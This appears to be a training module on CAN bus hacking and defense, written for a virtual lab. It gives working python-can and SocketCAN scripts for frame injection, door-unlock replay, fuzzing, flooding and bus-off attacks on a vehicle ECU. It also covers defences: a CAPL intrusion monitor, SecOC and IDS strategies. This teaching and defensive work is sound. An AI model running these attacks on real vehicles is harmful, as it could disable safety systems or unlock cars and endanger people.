# Module 05 — CAN Bus Hacking & Defense

> Level: Intermediate | Est. study time: 10 hours | Hands-on labs included

---

## 5.1 Attack Methodology

```
CAN ATTACK METHODOLOGY:

  Phase 1: RECONNAISSANCE
  ────────────────────────
  • Connect CAN adapter to OBD-II (physical access)
  • Capture raw CAN traffic using SavvyCAN / Wireshark (socketcan)
  • Identify active message IDs, DLC patterns, cycle times
  • Cross-reference IDs with known DBC databases (public leaks)
  • Perform action-based differential analysis

  Phase 2: IDENTIFICATION
  ────────────────────────
  • Reverse-engineer signals by triggering vehicle actions
  • Press accelerator → observe which CAN ID changes
  • Turn steering wheel → find steering angle signal
  • Build custom DBC mapping from observations
  • Identify counter bytes (incrementing patterns)
  • Identify CRC bytes (changing with each message)

  Phase 3: EXPLOITATION
  ────────────────────────
  • CAN injection (targeted signal manipulation)
  • Replay attack (record and retransmit)
  • Fuzzing (random/boundary value frames)
  • Bus-off attack (silence specific ECU)
  • DoS flood (consume all bus bandwidth)

  Phase 4: PERSISTENCE / LATERAL MOVEMENT
  ────────────────────────
  • Exploit diagnostic session for ECU reflash
  • Modify ECU configuration via UDS WriteDataByIdentifier
  • Plant persistent payload via firmware modification
```

---

## 5.2 Tools Deep-Dive

### SavvyCAN (GUI CAN analysis)

```
Key Features:
  - CAN frame capture and replay
  - DBC file loading and signal decoding
  - Differential analysis (X vs Y mode — find which IDs change during action)
  - Scripting engine
  - Graph view for signal time series

Connection:
  SavvyCAN → Serial/USB → GVRET device or SocketCAN
  
Differential Analysis Workflow:
  1. Record baseline (car idle, no actions)
  2. Record action (press brake pedal)
  3. SavvyCAN "Diff" mode → highlights IDs that changed
  4. Focus analysis on changed IDs
```

### SocketCAN (Linux)

```bash
# Setup virtual CAN interface (for lab)
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0

# Setup real CAN (PCAN-USB)
sudo modprobe peak_usb
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

# Dump all CAN traffic
candump vcan0

# Filter specific ID
candump vcan0 200:7FF   # Only frames with ID 0x200–0x3FF

# Inject a frame
cansend vcan0 244#0000000000000001

# Replay from candump log
canplayer -I captured.log vcan0=can0

# Stress test (flood)
cangen vcan0 -g 0 -I 000 -D 0000000000000000 -L 8
```

### Python CAN

```python
import can
import time

# Setup bus
bus = can.Bus(channel='vcan0', bustype='socketcan')

# --- SNIFF ---
print("Sniffing CAN traffic for 5 seconds...")
for msg in bus:
    print(f"ID: 0x{msg.arbitration_id:03X}  DLC: {msg.dlc}  "
          f"Data: {msg.data.hex()}")

# --- INJECT ---
msg = can.Message(
    arbitration_id=0x244,
    data=[0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01],
    is_extended_id=False
)
bus.send(msg)
print(f"Sent: {msg}")

# --- PERIODIC INJECTION ---
periodic_msg = can.Message(
    arbitration_id=0x3B0,
    data=[0x00, 0x00, 0x00, 0x00, 0xB4, 0x00, 0x00, 0x00],  # 90 km/h
    is_extended_id=False
)
task = bus.send_periodic(periodic_msg, period=0.01)  # 10ms = 100Hz
time.sleep(5.0)
task.stop()
bus.shutdown()
```

---

## 5.3 CAN Sniffing Lab

**Objective**: Capture and decode vehicle speed signal

**Setup**:
```bash
# Terminal 1: Start virtual vehicle simulator
python3 << 'EOF'
import can, time, random

bus = can.Bus(channel='vcan0', bustype='socketcan')
speed_kmh = 0

while True:
    speed_kmh = min(120, speed_kmh + random.uniform(-2, 5))
    raw = int(speed_kmh / 0.5)  # scale: 0.5 km/h per bit
    data = [0x00, 0x00, 0x00, 0x00, raw & 0xFF, (raw >> 8) & 0xFF, 0x00, 0x00]
    msg = can.Message(arbitration_id=0x3B0, data=data, is_extended_id=False)
    bus.send(msg)
    time.sleep(0.01)  # 100 Hz
EOF
```

**Terminal 2: Capture and decode**:
```python
import can

bus = can.Bus(channel='vcan0', bustype='socketcan')

print("ID       DLC  Data              Decoded")
print("-" * 60)

try:
    for msg in bus:
        if msg.arbitration_id == 0x3B0:
            raw_speed = msg.data[4] | (msg.data[5] << 8)
            speed_kmh = raw_speed * 0.5
            print(f"0x{msg.arbitration_id:03X}  {msg.dlc}    "
                  f"{msg.data.hex()}   VehicleSpeed={speed_kmh:.1f} km/h")
except KeyboardInterrupt:
    bus.shutdown()
```

**Expected Output**:
```
ID       DLC  Data              Decoded
------------------------------------------------------------
0x3B0    8    000000005a000000   VehicleSpeed=45.0 km/h
0x3B0    8    000000005e000000   VehicleSpeed=47.0 km/h
0x3B0    8    000000006200000 0  VehicleSpeed=49.0 km/h
```

---

## 5.4 CAN Signal Reverse Engineering (Differential Analysis)

**Step-by-step methodology:**

```python
import can
from collections import defaultdict

bus = can.Bus(channel='vcan0', bustype='socketcan')
baseline = {}
changed_ids = set()

# Phase 1: Record baseline (30 seconds, no user action)
print("Recording baseline... press nothing")
import time
end_time = time.time() + 30
while time.time() < end_time:
    msg = bus.recv(timeout=0.1)
    if msg:
        baseline[msg.arbitration_id] = bytes(msg.data)

print(f"Baseline: {len(baseline)} unique IDs")

# Phase 2: Record during action (press accelerator)
input("NOW press accelerator pedal continuously, press ENTER")
end_time = time.time() + 10
while time.time() < end_time:
    msg = bus.recv(timeout=0.1)
    if msg and msg.arbitration_id in baseline:
        if bytes(msg.data) != baseline[msg.arbitration_id]:
            changed_ids.add(msg.arbitration_id)

# Phase 3: Report candidates
print(f"\nIDs that changed during accelerator press:")
for id_ in sorted(changed_ids):
    print(f"  0x{id_:03X}  baseline: {baseline[id_].hex()}")
```

---

## 5.5 CAN Replay Attack Lab

```python
import can
import time

bus_src = can.Bus(channel='vcan0', bustype='socketcan')
bus_inject = can.Bus(channel='vcan0', bustype='socketcan')

# --- RECORD: Capture door unlock sequence ---
print("Waiting for door unlock signal... press unlock button now")
captured = []
unlock_detected = False

for msg in bus_src:
    if msg.arbitration_id == 0x354:  # Hypothetical: door control ID
        captured.append(msg)
        print(f"Captured: {msg}")
        if len(captured) >= 10:
            break

# --- REPLAY: Re-inject 30 seconds later ---
input("Move away from vehicle. Press ENTER to replay unlock")
time.sleep(2)

for msg in captured:
    bus_inject.send(can.Message(
        arbitration_id=msg.arbitration_id,
        data=msg.data,
        is_extended_id=msg.is_extended_id
    ))
    print(f"Replayed: {msg}")
    time.sleep(0.001)

# WHY THIS WORKS on pre-2018 vehicles:
# No rolling code counter, no timestamp validation
# SecOC/CMAC would prevent this (counter + MAC)
```

---

## 5.6 CAN Fuzzing Lab

```python
import can
import random
import time
from collections import defaultdict

bus = can.Bus(channel='vcan0', bustype='socketcan')

# Track IDs that show error frames after our injection
errors_before = defaultdict(int)
errors_after = defaultdict(int)

def fuzz_id(target_id: int, num_frames: int = 1000):
    """Fuzz a specific CAN ID with random data"""
    for i in range(num_frames):
        dlc = random.randint(0, 8)
        data = [random.randint(0, 255) for _ in range(dlc)]
        
        # Boundary value strategy: also test all-zeros, all-ones
        if i % 50 == 0:
            data = [0x00] * dlc
        elif i % 50 == 25:
            data = [0xFF] * dlc
        
        msg = can.Message(
            arbitration_id=target_id,
            data=data,
            is_extended_id=False
        )
        try:
            bus.send(msg)
        except can.CanError as e:
            print(f"Send error at frame {i}: {e}")
        
        time.sleep(0.001)  # 1ms between frames
    
    print(f"Fuzzing complete: {num_frames} frames sent to ID 0x{target_id:03X}")

# Smart fuzzing: target IDs from captured traffic
known_ids = [0x0CF, 0x244, 0x3B0, 0x440, 0x4B0]  # from prior sniffing
for id_ in known_ids:
    print(f"Fuzzing 0x{id_:03X}...")
    fuzz_id(id_, num_frames=500)
    time.sleep(1)  # observe ECU reaction
```

---

## 5.7 Bus-Off Attack Implementation

```python
"""
Bus-Off attack: Force a specific ECU off the bus by triggering error escalation.
This exploits CAN error detection mechanism.

WARNING: Educational only. Do not run on real vehicles.
"""
import can
import threading

target_id = 0x3B0  # Target: Vehicle Speed ECU
attack_bus = can.Bus(channel='vcan0', bustype='socketcan')

def bus_off_attack():
    """
    Strategy: Rapidly inject same ID as target
    → When target transmits, our injection causes bit stuffing error
    → Both increment error counters  
    → Weaker transmitter hits TEC=256 first → goes bus-off
    """
    attack_count = 0
    while attack_count < 10000:
        # Inject with highest priority that collides with target
        # Using same ID forces error on the actual sender's side
        msg = can.Message(
            arbitration_id=target_id,
            data=[0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF],
            is_extended_id=False
        )
        try:
            attack_bus.send(msg)
        except:
            pass
        attack_count += 1

# DETECTION METHOD (Defender perspective):
def monitor_bus_off(bus: can.Bus):
    """Detect bus-off attack by monitoring expected periodic messages"""
    last_seen = {}
    
    while True:
        msg = bus.recv(timeout=0.1)
        if msg:
            last_seen[msg.arbitration_id] = time.time()
        
        # Check for silent ECUs (missing expected periodic messages)
        for expected_id in [0x3B0, 0x440, 0x0CF]:  # expected periodic IDs
            last = last_seen.get(expected_id, 0)
            if time.time() - last > 0.5:  # Missing for >500ms
                print(f"ALERT: ECU 0x{expected_id:03X} may be in bus-off state!")
```

---

## 5.8 DBC Analysis and Signal Decoding

```python
"""
DBC-based signal decoding using cantools
"""
import cantools
import can

# Load DBC file
db = cantools.database.load_file('adas_vehicle.dbc')

# Print all messages
for msg in db.messages:
    print(f"Message: {msg.name} (0x{msg.frame_id:03X}, {msg.length} bytes)")
    for sig in msg.signals:
        print(f"  Signal: {sig.name}, start={sig.start}, length={sig.length}, "
              f"scale={sig.scale}, offset={sig.offset}, unit={sig.unit}")

# Decode live traffic
bus = can.Bus(channel='vcan0', bustype='socketcan')

for raw_msg in bus:
    try:
        decoded = db.decode_message(raw_msg.arbitration_id, raw_msg.data)
        print(f"ID 0x{raw_msg.arbitration_id:03X}: {decoded}")
    except KeyError:
        pass  # Unknown message ID
```

**DBC File Structure Example:**
```
BO_ 0x3B0 VehicleSpeed: 8 ECM
  SG_ VehicleSpeed_kmh : 32|16@1+ (0.5,0) [0|327.5] "km/h" BCM,ADAS_ECU
  SG_ EngineSpeed_rpm  : 0|16@1+  (0.25,0) [0|16383] "rpm" IPC,ADAS_ECU
  SG_ Gear             : 16|4@1+  (1,0) [0|15] "" IPC

BO_ 0x244 AEB_Control: 8 ADAS_ECU
  SG_ AEB_BrakeRequest : 0|16@1+ (0.1,0) [0|100] "%" ECM
  SG_ AEB_Active       : 16|1@1+ (1,0) [0|1] "" BCM,IPC
  SG_ AEB_Counter      : 24|4@1+ (1,0) [0|15] "" GW
  SG_ AEB_CRC          : 28|4@1+ (1,0) [0|15] "" GW
```

---

## 5.9 CAPL CAN Security Monitoring

```capl
/* CAN Security Monitor in CANoe/CAPL */

variables {
    int   busLoad        = 0;
    float maxBusLoad     = 70.0;  // Alert threshold %
    int   unknownIDCount = 0;
    
    // Known valid IDs (whitelist)
    int validIDs[10] = {0x0CF, 0x244, 0x3B0, 0x354, 0x440, 
                        0x4B0, 0x540, 0x630, 0x700, 0x7DF};
}

/* Monitor bus load */
on busload CAN1 {
    busLoad = this;
    if (busLoad > maxBusLoad) {
        write("SECURITY ALERT: CAN bus overload! Load = %d%%", busLoad);
        setSignalValue("VSOC.BusLoadAlert", 1);
    }
}

/* Detect unknown IDs (whitelist enforcement) */
on message * {
    int i;
    int isKnown = 0;
    
    for (i = 0; i < elcount(validIDs); i++) {
        if (this.id == validIDs[i]) {
            isKnown = 1;
            break;
        }
    }
    
    if (!isKnown) {
        unknownIDCount++;
        write("SECURITY ALERT: Unknown CAN ID 0x%03X detected! Count=%d", 
              this.id, unknownIDCount);
        if (unknownIDCount > 5) {
            write("CRITICAL: Potential CAN injection attack!");
        }
    }
}

/* Monitor AEB signal for injection */
on message 0x244 {  // AEB_Control
    byte aeb_crc = this.byte(3) & 0x0F;   // CRC nibble
    byte aeb_cnt = (this.byte(3) >> 4) & 0x0F;  // Counter nibble
    
    // Check counter continuity
    static byte lastCounter = 0;
    if ((aeb_cnt - lastCounter) != 1 && lastCounter != 0) {
        write("SECURITY ALERT: AEB counter jump! expected %d got %d",
              lastCounter+1, aeb_cnt);
    }
    lastCounter = aeb_cnt;
    
    // Validate CRC (simplified XOR CRC example)
    byte computed = this.byte(0) ^ this.byte(1) ^ this.byte(2) ^ (aeb_cnt << 4);
    if ((computed & 0x0F) != aeb_crc) {
        write("SECURITY ALERT: AEB CRC mismatch! Possible injection!");
    }
}
```

---

## 5.10 Defense Strategies

### SecOC (Secure Onboard Communication)

```
Without SecOC:                    With SecOC:
ID: 0x244                         ID: 0x244
Data: AEB_BrakeRequest            Data: AEB_BrakeRequest + FreshnessValue + MAC
→ Any node can inject             → Injected without valid MAC → rejected by receiver

SecOC PDU Structure:
┌────────────────────────────────┬──────────────────┬─────────────────┐
│     Original Data Payload      │ Freshness Value  │     MAC         │
│        (N bytes)               │  (truncated,     │  (CMAC-AES128,  │
│                                │   e.g. 24 bits)  │   truncated     │
│                                │                  │   to fit DLC)   │
└────────────────────────────────┴──────────────────┴─────────────────┘

MAC = CMAC-AES-128(Key, FreshnessValue || MessageID || Data)
Key = provisioned per ECU-pair, stored in HSM
FreshnessValue = monotonic counter (prevents replay)
```

### CAN Intrusion Detection System (IDS)

```
IDS strategies:
1. Message frequency monitoring
   → Each ID has a known cycle time (from DBC/spec)
   → Alert if ID arrives >20% faster than spec (injection indicator)
   
2. Signal range validation
   → Each signal has physical min/max
   → Alert if VehicleSpeed > 350 km/h (not physically possible)
   
3. Counter monitoring
   → SecOC counter must increment monotonically
   → Counter gap or reset → replay attack or injection
   
4. Unknown ID detection
   → Whitelist all valid CAN IDs in firewall (gateway)
   → Any non-whitelisted ID → dropped + alert
   
5. Payload fingerprinting
   → Statistical model of expected data patterns
   → Anomaly detection using ML (Isolation Forest, Autoencoder)
```

---

## 5.11 Summary — Module 05

```
KEY TAKEAWAYS:

✓ CAN has zero built-in security — attacker with OBD-II access can do anything
✓ Differential analysis is the most effective reverse engineering technique
✓ Bus-off attack can silence critical safety ECUs (AEB, EPS)
✓ Replay attacks work on any CAN bus without rolling codes/freshness values
✓ SecOC (AUTOSAR) with CMAC-AES-128 + freshness counter is the standard defense
✓ Gateway firewall (ID whitelist + rate limiting) stops most injection attacks
✓ candump, cansend, python-can are your primary open-source lab tools
✓ SavvyCAN differential mode is the fastest way to find target signals
```

**Lab files**: [can_sniffer.py](../scripts/can_sniffer.py) | [can_injector.py](../scripts/can_injector.py)

**Next Module**: [06 — UDS & Diagnostic Security](06_uds_diagnostics.md)
